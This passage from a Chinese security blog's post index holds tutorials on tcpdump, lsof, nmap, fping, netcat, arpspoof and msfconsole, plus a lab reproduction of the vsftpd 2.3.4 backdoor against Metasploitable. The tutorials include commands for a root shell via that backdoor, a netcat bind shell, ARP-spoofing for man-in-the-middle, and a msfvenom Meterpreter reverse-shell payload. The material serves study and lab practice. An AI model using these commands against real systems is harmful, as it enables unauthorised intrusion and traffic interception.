-l port 80 | grep \u0026#39;Server:\u0026#39; 六、实战案例 6.1 捕获特定主机的HTTP流量 1 tcpdump -i eth0 -n -X tcp port 80 and host 192.168.1.1 -n：不解析主机名。 -X：以十六进制和ASCII格式显示内容。 tcp port 80：筛选TCP协议的80端口（HTTP）。 host 192.168.1.1：指定主机IP。 6.2 分析网络延迟 1 tcpdump -i eth0 -tttt -c 100 -tttt：显示时间戳，精确到秒。 -c 100：捕获100个数据包。 通过观察时间戳，可以分析网络延迟情况。 6.3 捕获并保存数据包 1 tcpdump -i eth0 -w capture.pcap 将捕获的数据包保存到capture.pcap文件中，后续可以使用Wireshark等工具进行详细分析。 七、注意事项 权限问题：TCPdump 需要管理员权限才能运行。 性能影响：在高流量的网络环境中，TCPdump 可能会对系统性能产生一定影响。 隐私问题：捕获的数据包可能包含敏感信息，请确保合法使用。 ","date":"2025-04-21T21:18:27+08:00","permalink":"https://souljian.cn/p/745241507/","title":"Tcpdump命令使用"},{"content":"实验笔记：vsftpd 2.3.4 笑脸漏洞复现\n实验目标 复现 vsftpd 2.3.4 的\u0026quot;笑脸漏洞\u0026quot;，通过该漏洞获取靶机的 root 权限。\n实验环境 攻击机：Kali Linux 靶机：Metasploitable Linux 2.0.0 实验步骤 一、环境搭建 下载并启动靶机\n下载 Metasploitable Linux 2.0.0 镜像文件。 解压后使用 VMware 打开并启动虚拟机。 登录靶机并修改 root 密码\n使用普通用户 msfadmin 登录，密码为 msfadmin。\n修改 root 用户的密码：\n1 msfadmin@metasploitable:~$ sudo passwd root 按提示输入新密码。\n二、漏洞复现 端口扫描\n在 Kali Linux 上打开终端，使用 nmap 扫描靶机的开放端口：\n1 nmap 192.168.xx.xx （将 192.168.xx.xx 替换为靶机的实际 IP 地址）\n确认靶机开放了 21 (FTP) 端口。\n扫描 FTP 服务版本\n使用 nmap 扫描 FTP 服务的版本信息：\n1 nmap -sV 192.168.xx.xx 确认靶机运行的是 vsftpd 2.3.4 版本。\n触发漏洞\n在 Kali Linux 上使用 Netcat (nc) 连接靶机的 21 端口：\n1 nc 192.168.xx.xx 21 输入以下命令（注意手动输入）：\n1 2 user mz:) pass aaaaa 此时靶机的 6200 端口会自动开启。保持当前终端状态，不要关闭。\n验证 6200 端口\n在 Kali Linux 上另起一个终端，使用 nmap 扫描 6200 端口：\n1 sudo nmap -sS -p 6200 192.168.xx.xx 确认 6200 端口已开启。\n获取 root 权限\n使用 Netcat 连接靶机的 6200 端口：\n1 nc 192.168.xx.xx 6200 成功连接后，即可以 root 身份登录靶机。\n注意：连接后执行ls查看是都已经进去半终端\n确认进入半终端可执行python -c \u0026lsquo;import pty;pty.spawn(\u0026quot;/bin/bash\u0026quot;)\u0026rsquo; 调用完整终端\n三、实验注意事项 如果在实验过程中遇到问题，可以尝试重启靶机。 确保在触发漏洞后保持 Netcat 连接状态，否则 6200 端口可能会关闭。 实验总结： 本次实验通过 vsftpd 2.3.4 的\u0026quot;笑脸漏洞\u0026quot;，成功获取了靶机的 root 权限。实验过程中，关键在于正确触发漏洞并保持 Netcat 连接状态，以确保后续操作的顺利进行。\n","date":"2025-04-21T12:59:27+08:00","permalink":"https://souljian.cn/p/745211567/","title":"FTP笑脸漏洞复现"},{"content":"一、简介 arpspoof 是一款用于 ARP 欺骗的工具，能够发送伪造的 ARP 数据包，欺骗网络中的设备，使其将攻击者的设备误认为是目标设备。这通常用于中间人攻击（MITM），例如捕获网络流量或篡改数据。\n二、安装 （一）Kali Linux arpspoof 在 Kali Linux 中通常已经预装。如果没有安装，可以通过安装 dsniff 包来获取：\n1 2 sudo apt-get update sudo apt-get install dsniff （二）Ubuntu 在 Ubuntu 上，arpspoof 也包含在 dsniff 包中：\n1 2 sudo apt-get update sudo apt-get install dsniff （三）CentOS 在 CentOS 上，可以通过安装 dsniff 包来获取 arpspoof：\n1 2 sudo yum install epel-release sudo yum install dsniff 安装完成后，可以通过以下命令验证 arpspoof 是否安装成功：\n1 arpspoof --help 三、基本语法 1 arpspoof [选项] [目标 IP] 四、常用选项 选项 说明 -i \u0026lt;接口\u0026gt; 指定要使用的网络接口。 -t \u0026lt;目标 IP\u0026gt; 指定一个特殊的、将被 ARP 毒化的主机。 -r 毒化两个主机（目标和主机）以捕获两个方向的网络流量。 `-c own host 五、使用示例 （一）欺骗单个目标 1 sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1 将目标主机（192.168.1.100）的 ARP 表项中的默认网关（192.168.1.1）指向攻击者的设备。\n（二）自动欺骗网关 1 sudo arpspoof -i eth0 -r 192.168.1.100 自动将目标主机（192.168.1.100）的 ARP 表项中的默认网关指向攻击者的设备。\n（三）欺骗整个网络 1 sudo arpspoof -i eth0 -t 192.168.1.0/24 192.168.1.1 将整个网络中的设备的 ARP 表项中的默认网关指向攻击者的设备。\n（四）恢复 ARP 表项 1 sudo arpspoof -i eth0 -c both -t 192.168.1.100 192.168.1.1 恢复目标主机（192.168.1.100）的 ARP 表项，使其恢复正常。\n六、注意事项 权限问题：arpspoof 需要管理员权限才能运行。 网络环境：某些网络环境可能检测到 ARP 欺骗行为并采取措施。 法律问题：未经授权的 ARP 欺骗行为可能违反法律法规。 网络拓扑：在复杂的网络环境中，可能需要调整攻击策略以确保有效欺骗。 工具替代：如果 arpspoof 不可用，可以使用其他工具（如 ettercap 或 bettercap）来实现类似功能。 七、总结 arpspoof 是一个功能强大的 ARP 欺骗工具，常用于中间人攻击（MITM）。通过掌握基本语法和高级用法，可以快速实现网络流量的捕获和篡改，帮助进行网络安全测试和分析。\n","date":"2025-04-21T10:40:37+08:00","permalink":"https://souljian.cn/p/745203237/","title":"Arpspoof命令使用"},{"content":" 一、lsof 简介 lsof（List Open Files）是一个功能强大的命令行工具，用于列出当前系统中所有打开的文件及其相关进程。在 Unix 和 Linux 系统中，几乎所有事物（包括常规文件、目录、网络连接、设备等）都被视为文件，因此 lsof 在多种场景下都非常有用。\n二、安装 lsof 在大多数 Linux 发行版中，lsof 可通过包管理器安装：\nDebian/Ubuntu：\n1 2 sudo apt update sudo apt install lsof CentOS/RHEL：\n1 sudo yum install lsof Arch Linux：\n1 sudo pacman -S lsof 三、基本语法 1 lsof [选项] [文件名或目录] 四、常用选项 （一）按进程过滤 -p \u0026lt;PID\u0026gt;：按进程 ID 过滤。\n1 lsof -p 1234 -c \u0026lt;进程名\u0026gt;：按进程名过滤。\n1 lsof -c sshd -c \u0026lt;进程名1\u0026gt; -c \u0026lt;进程名2\u0026gt;：同时列出多个进程的打开文件。\n1 lsof -c mysql -c apache （二）按用户过滤 -u \u0026lt;用户名\u0026gt;：按用户名过滤。\n1 lsof -u username -u ^\u0026lt;用户名\u0026gt;：排除指定用户的打开文件。\n1 lsof -u ^root （三）按文件名或目录过滤 指定文件名或目录名，列出与之相关的打开文件。\n1 2 lsof /path/to/file lsof /path/to/directory 使用 +D 递归列出目录及其子目录下所有打开的文件。\n1 lsof +D /path/to/directory （四）按网络连接过滤 -i：显示所有网络连接。\n1 lsof -i -i :\u0026lt;端口号\u0026gt;：按端口号过滤。\n1 lsof -i :80 -i \u0026lt;协议\u0026gt;@\u0026lt;IP地址\u0026gt;：按协议和 IP 地址过滤。\n1 lsof -i tcp@192.168.1.100 -i TCP：仅显示 TCP 连接。\n1 lsof -i TCP -i UDP：仅显示 UDP 连接。\n1 lsof -i UDP （五）其他选项 -n：不解析主机名，直接显示 IP 地址。\n-P：不解析端口号，直接显示数字。\n-t：仅显示进程 ID。\n-l：显示文件的 inode 号。\n-a：组合多个条件。\n1 lsof -u username -c process_name 五、使用场景 （一）查找占用特定文件的进程 1 lsof /var/log/syslog 此命令可帮助你找出哪个进程正在使用 /var/log/syslog 文件。\n（二）查找占用特定端口的进程 1 lsof -i :80 此命令可帮助你找出哪个进程正在使用 TCP 端口 80。\n（三）查找某个用户打开的文件 1 lsof -u username 此命令可列出用户 username 打开的所有文件。\n（四）查看某个进程打开的文件 1 lsof -p 1234 此命令可列出进程 ID 为 1234 的所有打开文件。\n（五）查找被删除但仍在使用的文件 1 lsof | grep deleted 此命令可帮助你找出已被删除但仍被进程占用的文件。\n（六）监控文件系统活动 1 lsof +D /path/to/directory 此命令可实时监控指定目录及其子目录下所有打开的文件。\n（七）查找打开的文件数量 1 lsof | wc -l 此命令可统计系统中打开的文件总数。\n（八）识别资源泄漏 1 lsof -p \u0026lt;PID\u0026gt; 此命令可帮助你查找某个进程打开的文件，从而排查资源泄漏问题。\n（九）查看特定类型的文件 1 lsof -U 此命令可列出所有 Unix 域套接字。\n六、高级用法 （一）列出监听的网络连接 1 lsof -i TCP:LISTEN 此命令可列出所有处于监听状态的 TCP 端口。\n（二）列出特定用户的网络连接 1 lsof -a -u username -i 此命令可列出用户 username 的所有网络连接。\n（三）列出特定协议的文件 1 lsof -i TCP:https 此命令可列出所有使用 HTTPS 端口的 TCP 文件。\n（四）重复模式 1 lsof -r 5 -i UDP 此命令每 5 秒输出一次所有正在进行的 UDP 连接，直到手动终止。\n（五）列出特定范围的文件描述符 1 lsof -d 2-3 此命令可列出文件描述符范围为 2-3 的文件。\n七、注意事项 权限问题：某些信息（如其他用户的文件）可能需要管理员权限才能查看。 输出格式：lsof 的输出包含多个字段，如进程 ID、用户、文件描述符等。可以通过 man lsof 查看详细字段说明。 性能影响：在系统文件数量较多时，lsof 的运行可能会稍显缓慢，尤其是在没有过滤条件的情况下。 八、总结 lsof 是一个功能强大的工具，适用于多种场景，包括故障排查、性能监测、资源管理等。通过掌握基本语法和常用选项，可以快速定位文件占用、网络连接等问题。结合过滤条件和其他命令，lsof 的应用场景更加广泛，能够满足复杂的系统管理和调试需求。\n","date":"2025-04-21T10:39:12+08:00","permalink":"https://souljian.cn/p/745203152/","title":"Lsof命令使用"},{"content":"一、简介 nc（Netcat）是一个功能强大的网络工具，用于读写网络连接（TCP 和 UDP）。它常被称为\u0026quot;网络瑞士军刀\u0026quot;，可用于端口扫描、数据传输、远程控制等多种用途。\n二、安装 （一）通过包管理器安装 Debian/Ubuntu：\n1 2 sudo apt update sudo apt install netcat CentOS/RHEL：\n1 sudo yum install nc Arch Linux：\n1 sudo pacman -S inetutils Fedora：\n1 sudo dnf install nc openSUSE：\n1 sudo zypper install netcat-openbsd （二）从源代码编译安装 从官方网站下载 nc 的源代码。\n解压源代码包并进入解压后的目录。\n执行以下命令来编译和安装 nc：\n1 2 3 ./configure make sudo make install （三）验证安装 安装完成后，可以通过运行以下命令来验证 nc 是否安装成功：\n1 nc -h 如果返回 nc 命令的帮助信息，则表示安装成功。\n三、基本语法 1 nc [选项] [主机] [端口] 四、常用选项 选项 说明 -l 使用监听模式，管控传入的资料 -p 设置本地主机使用的通信端口 -s 设置本地主机送出数据包的 IP 地址 -u 使用 UDP 传输协议 -v 显示指令执行过程 -w 设置等待连线的时间 -z 使用 0 输入/输出模式，只在扫描通信端口时使用 五、使用示例 （一）端口扫描 TCP 端口扫描：\n1 nc -zv 192.168.1.1 80-443 扫描目标 IP 地址（192.168.1.1）上的端口 80 到 443，检查是否开放。\nUDP 端口扫描：\n1 nc -zvu 192.168.1.1 53 扫描目标主机的 UDP 端口 53。\n（二）监听端口 TCP 端口监听：\n1 nc -l 8080 在本地监听 8080 端口。\nUDP 端口监听：\n1 nc -u -l 8080 使用 UDP 协议监听 8080 端口。\n（三）数据传输 发送文件：\n1 nc 192.168.1.2 12345 \u0026lt; file.txt 将 file.txt 发送到远程主机的 12345 端口。\n接收文件：\n1 nc -l 12345 \u0026gt; file.txt 在本地监听 12345 端口并接收文件。\n（四）远程命令执行 目标机器上：\n1 nc -lvp 4444 -e /bin/bash 在目标机器上监听 4444 端口，并将 /bin/bash 作为远程命令执行。\n攻击者机器上：\n1 nc 192.168.1.2 4444 连接到目标机器的 4444 端口，获取远程命令执行的 Shell。\n（五）端口转发 本地端口转发：\n1 nc -l 8080 | nc 192.168.1.100 80 将本地 8080 端口的数据转发到远程服务器的 80 端口。\n（六）网络调试 发送 HTTP 请求：\n1 echo -ne \u0026#34;GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n\u0026#34; | nc example.com 80 向目标服务器发送 HTTP 请求。\n六、注意事项 权限问题：某些功能（如监听低端口号）可能需要管理员权限。 安全问题：使用远程命令执行功能时需谨慎，避免安全风险。 版本差异：不同版本的 nc（如 netcat、ncat）功能可能有所不同。 安装路径：安装完成后，可能需要将 nc 的路径添加到系统的环境变量中，以便在任意终端中直接使用。 七、总结 nc 是一个功能强大的网络工具，适用于多种场景，包括端口扫描、数据传输、远程控制等。通过掌握基本语法和高级功能，可以快速实现网络通信和数据传输，帮助进行网络管理和故障排查。\n","date":"2025-04-21T10:37:16+08:00","permalink":"https://souljian.cn/p/745203036/","title":"Nc（netcat）命令使用"},{"content":"一、简介 msfconsole 是 Metasploit Framework 的命令行界面，用于执行各种安全测试和渗透测试任务。Metasploit 是一个功能强大的渗透测试工具，提供了丰富的漏洞利用模块、后渗透工具和自动化功能。\n二、安装 Kali Linux（Metasploit 已预装）：\n1 2 sudo apt update sudo apt install metasploit-framework 其他 Linux 发行版： 可以通过 Rapid7 官方网站 获取安装指南。\n三、基本语法 1 msfconsole 四、常用命令 （一）启动 msfconsole 1 msfconsole （二）查找模块 1 search \u0026lt;keyword\u0026gt; 例如：\n1 search apache （三）使用模块 1 use \u0026lt;module\u0026gt; 例如：\n1 use exploit/unix/webapp/apache_mod_cgi （四）设置模块选项 1 set \u0026lt;option\u0026gt; \u0026lt;value\u0026gt; 例如：\n1 2 set RHOSTS 192.168.1.100 set RPORT 80 （五）查看模块选项 1 show options （六）运行模块 1 run （七）退出 msfconsole 1 exit 五、高级用法 （一）自动化攻击 使用 msfconsole 的自动化功能可以快速执行攻击任务。例如：\n1 msfconsole -q -x \u0026#34;use exploit/unix/webapp/apache_mod_cgi; set RHOSTS 192.168.1.100; set RPORT 80; run\u0026#34; （二）生成 Meterpreter 有效载荷 1 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe （三）使用 Meterpreter 会话 1 2 sessions -l sessions -i \u0026lt;session_id\u0026gt; （四）后渗透攻击 1 2 search post use post/windows/manage/persistence （五）利用漏洞 1 2 3 4 5 search exploit use exploit/unix/webapp/apache_mod_cgi set RHOSTS 192.168.1.100 set RPORT 80 run （六）端口扫描 查看端口扫描模块：\n1 search portscan 使用端口扫描模块：\n1 use auxiliary/scanner/portscan/top 查看模块选项：\n1 show options 设置目标 IP：\n1 set RHOSTS 192.168.1.100 设置线程数：\n1 set THREADS 100 执行扫描：\n1 run （七）服务扫描 查看服务扫描模块：\n1 search smb_version 使用服务扫描模块：\n1 use auxiliary/scanner/smb/smb_version 查看模块选项：\n1 show options 设置目标 IP：\n1 set RHOSTS 192.168.1.100 设置线程数：\n1 set THREADS 10 执行扫描：\n1 run 六、注意事项 权限问题：某些功能（如监听低端口号）可能需要管理员权限。 网络环境：某些网络环境可能限制某些模块的使用。 法律问题：未经授权的渗透测试行为可能违反法律法规。 七、总结 msfconsole 是一个功能强大的渗透测试工具，适用于多种安全测试场景，包括漏洞利用、后渗透攻击和自动化攻击。通过掌握基本语法和高级用法，可以快速定位网络中的漏洞并进行安全审计。\n","date":"2025-04-20T23:10:14+08:00","permalink":"https://souljian.cn/p/745161814/","title":"Msfconsole命令使用"},{"content":"一、简介 nmap 是一款开源的网络探测和安全审核工具，可以用来扫描网络主机，确定哪些主机在运行、运行哪些服务以及运行哪个操作系统等信息。它支持多种扫描技术，能够识别网络上的活跃设备、开放端口、运行服务和操作系统类型。\n二、安装 Debian/Ubuntu：\n1 2 sudo apt update sudo apt install nmap CentOS/RHEL：\n1 sudo yum install nmap Arch Linux：\n1 sudo pacman -S nmap 三、基本语法 1 nmap [选项] [目标] 四、常用选项 （一）扫描类型 -sS：TCP SYN 扫描（半开放扫描）。 -sT：TCP 连接扫描。 -sU：UDP 扫描。 -sP：仅进行主机发现。 -sV：服务版本检测。 -O：操作系统检测。 （二）端口指定 -p \u0026lt;端口\u0026gt;：指定扫描的端口范围。\n1 nmap -p 80,443 target_ip -p-：扫描所有 65535 个端口。\n1 nmap -p- target_ip （三）输出选项 -oN \u0026lt;文件\u0026gt;：将扫描结果保存到普通文本文件。\n1 nmap -oN scan_results.txt target_ip -oX \u0026lt;文件\u0026gt;：将扫描结果保存为 XML 格式。\n1 nmap -oX scan_results.xml target_ip -oG \u0026lt;文件\u0026gt;：将扫描结果保存为 Grepable 格式。\n1 nmap -oG scan_results.gnmap target_ip （四）其他选项 -v：详细模式，显示更多信息。\n1 nmap -v target_ip -A：启用操作系统和服务版本检测。\n1 nmap -A target_ip -T \u0026lt;级别\u0026gt;：设置扫描速度（0 最慢，5 最快）。\n1 nmap -T4 target_ip -Pn：跳过主机发现，直接扫描指定主机。\n1 nmap -Pn target_ip 五、高级功能与选项 （一）服务版本检测 使用 -sV 选项可以检测目标主机开放端口上运行的服务及其版本信息。这对于漏洞扫描和服务识别非常有用：\n1 nmap -sV target_ip （二）操作系统检测 nmap 可以通过分析网络堆栈，尝试识别目标主机的操作系统类型和版本：\n1 nmap -O target_ip （三）脚本扫描 nmap 的脚本引擎（NSE）支持数百个脚本，涵盖从服务检测到漏洞扫描、恶意软件检测、Brute-force 攻击等多种用途。例如，使用漏洞扫描脚本集：\n1 nmap --script vuln target_ip （四）扫描速度控制 在高流量或防火墙严格的网络环境中，可以通过 -T 选项调整扫描速度（0为最慢，5为最快）。例如，快速扫描：\n1 nmap -T4 target_ip （五）防火墙规避 nmap 提供了一些技术来规避防火墙和入侵检测系统（IDS），例如使用碎片化数据包（-f）、修改扫描速率（-T0 至 -T5）。\n（六）并发扫描与负载优化 nmap 支持并发扫描和负载优化，以提高扫描效率。例如，禁用主机发现（-Pn）和 DNS 解析（-n）：\n1 nmap -Pn -n target_ip （七）自定义数据包发送 高级用户可以利用 nmap 构建和发送自定义数据包，例如通过 --data-length、--data-string 等参数。\n（八）网络拓扑发现与可视化 nmap 可以结合 traceroute 绘制网络拓扑图，展示网络设备之间的连接关系。\n（九）漏洞扫描与安全审计 借助 NSE 脚本，nmap 可以进行各种漏洞扫描，包括已知漏洞的检测和配置错误的识别。\n（十）结果输出与报告生成 nmap 支持多种结果输出格式，如标准输出、XML 格式（-oX）、Grepable 格式（-oG）。\n六、使用示例 （一）基本扫描 扫描单个主机：\n1 nmap 192.168.1.100 扫描多个主机：\n1 nmap 192.168.1.1-10 扫描特定端口：\n1 nmap -p 80,443 192.168.1.100 （二）高级扫描 服务版本检测：\n1 nmap -sV 192.168.1.100 操作系统检测：\n1 nmap -O 192.168.1.100 快速扫描：\n1 nmap -F 192.168.1.100 扫描网络中的所有主机：\n1 nmap -sP 192.168.1.0/24 （三）脚本扫描 使用 NSE 脚本进行漏洞扫描：\n1 nmap --script vuln 192.168.1.100 使用特定脚本：\n1 nmap --script http-title 192.168.1.100 （四）防火墙规避 使用碎片化数据包：\n1 nmap -f 192.168.1.100 调整扫描速度：\n1 nmap -T0 192.168.1.100 （五）并发扫描与负载优化 禁用主机发现和 DNS 解析：\n1 nmap -Pn -n 192.168.1.100 七、注意事项 权限问题：某些扫描类型（如 -sS）需要管理员权限才能运行。 网络环境：某些网络环境可能限制 ICMP 请求或特定端口的扫描。 扫描速度：在高流量或防火墙严格的网络环境中，需要调整扫描速度以避免被检测到。 结果输出：使用 -oN、-oX、-oG 等选项保存扫描结果，便于后续分析。 八、总结 nmap 是一个功能强大的网络扫描工具，适用于多种场景，包括网络发现、端口扫描、服务检测、操作系统识别和漏洞扫描。通过掌握基本语法和高级功能，可以快速定位网络中的设备和服务，帮助进行网络管理和安全审计。\n","date":"2025-04-20T22:59:14+08:00","permalink":"https://souljian.cn/p/745161154/","title":"Nmap命令使用"},{"content":" 一、简介 fping 是一个用于发送 ICMP Echo 请求的工具，类似于 ping，但它可以同时对多个主机进行 ICMP Echo 请求，并且输出结果更加简洁。它特别适合用于批量检测主机的存活性。\n二、安装 Debian/Ubuntu：\n1 2 sudo apt update sudo apt install fping CentOS/RHEL：\n1 sudo yum install fping Arch Linux：\n1 sudo pacman -S fping 三、基本语法 1 fping [选项] [主机列表] 四、常用选项 -a：仅显示存活的主机。 -b：设置 ping 数据包的大小（默认为 56 字节）。 -c：设置每个目标的 ping 次数（默认为 1）。 -f：从文件获取目标列表（不能与 -g 同时使用）。 -g：通过指定起始和结束地址来生成目标列表，可以是网段。 -l：循环发送 ping。 -u：显示不可到达的目标。 -s：显示统计信息，包括发送和接收的 ICMP Echo 请求数量。 五、使用示例 （一）基本用法 ping 单个主机：\n1 fping 192.168.1.100 发送 ICMP Echo 请求到 192.168.1.100。\nping 多个主机：\n1 fping 192.168.1.1 192.168.1.2 192.168.1.3 同时对多个主机发送 ICMP Echo 请求。\nping 网段中的所有主机：\n1 fping -g 192.168.1.0/24 生成并扫描 192.168.1.0/24 网段中的所有主机。\n仅显示存活的主机：\n1 fping -a 192.168.1.1 192.168.1.2 192.168.1.3 仅显示响应 ICMP Echo 请求的主机。\n（二）高级用法 显示统计信息：\n1 fping -s 192.168.1.1 192.168.1.2 192.168.1.3 发送 ICMP Echo 请求并显示统计信息，包括发送和接收的 ICMP Echo 请求数量。\n指定发送次数和间隔：\n1 fping -c 3 -i 100 192.168.1.100 对 192.168.1.100 发送 3 次 ICMP Echo 请求，每次请求间隔 100 毫秒。\n从文件中读取主机列表：\n1 fping -f hosts.txt 从文件 hosts.txt 中读取主机列表并进行 ICMP Echo 请求。\n显示存活的主机并统计：\n1 fping -a -s 192.168.1.0/24 扫描 192.168.1.0/24 网段中的所有主机，仅显示存活的主机并显示统计信息。\n六、注意事项 权限问题：fping 需要管理员权限才能发送 ICMP 请求。 网络环境：某些网络环境可能限制 ICMP 请求，导致 fping 无法正常工作。 输出格式：fping 的输出格式较为简洁，适合批量检测主机存活性。 七、总结 fping 是一个功能强大的工具，特别适合用于批量检测主机的存活性。通过掌握基本语法和常用选项，可以快速定位网络中的存活主机。结合 -s 参数，可以获取更详细的统计信息，帮助分析网络状态。\n","date":"2025-04-20T20:49:53+08:00","permalink":"https://souljian.cn/p/745153393/","title":"Fping命令使用"}]